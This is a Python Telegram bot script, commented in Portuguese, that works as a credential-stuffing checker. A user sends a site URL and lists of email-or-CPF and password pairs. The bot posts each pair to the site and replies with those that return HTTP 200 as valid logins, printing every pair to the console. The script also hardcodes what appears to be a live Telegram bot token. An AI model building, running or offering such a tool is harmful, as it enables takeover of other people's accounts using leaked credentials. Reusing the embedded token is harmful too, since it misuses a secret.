import telebot
import requests

# Seu token aqui
bot = telebot.TeleBot('7440723696:AAGtSoDRhnDGN4XfeV_eMbLnkvXDsgFpvZQ')

# Variáveis para armazenar a URL e os logins
site_url = ""
logins = []

# Função para verificar se é email ou CPF
def is_email_or_cpf(login):
    if '@' in login:
        return 'email'
    else:
        return 'cpf'

# Função para tentar logar no site
def tentar_login(site_url, login, senha):
    try:
        # Aqui você implementa a lógica para tentar logar no site
        # Exemplo: usando requests para simular o POST de login
        response = requests.post(site_url, data={'login': login, 'senha': senha})
        if response.status_code == 200:  # Supondo que um status 200 indica sucesso
            return True
        else:
            return False
    except Exception as e:
        print(f"Erro ao tentar login: {e}")  # Mostrar erros no Termux
        return False

# Comando /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Me envie a URL do site.")

# Recebendo a URL do site
@bot.message_handler(func=lambda message: message.text.startswith("http"))
def receive_site_url(message):
    global site_url
    site_url = message.text
    bot.reply_to(message, "Agora me envie os logins que deseja verificar, envie dessa forma:\nemail123@gmail.com|senha123\n123.456.789-10|senha123")

# Recebendo os logins e senhas
@bot.message_handler(func=lambda message: "|" in message.text)
def receive_logins(message):
    global logins
    login_data = message.text.split("\n")  # Dividindo cada linha de login
    logins_validos = []
    
    for item in login_data:
        if '|' in item:
            login, senha = item.split('|')
            login = login.strip()
            senha = senha.strip()

            print(f"Verificando: {login} | {senha}")  # Mostrar no Termux
            
            if tentar_login(site_url, login, senha):
                logins_validos.append(f"{login}|{senha}")
    
    if logins_validos:
        validos_msg = "Aqui estão alguns logins válidos:\n" + "\n".join(logins_validos)
        bot.reply_to(message, validos_msg)
    else:
        bot.reply_to(message, "Nenhum login válido foi encontrado.")

# Iniciando o bot
bot.polling()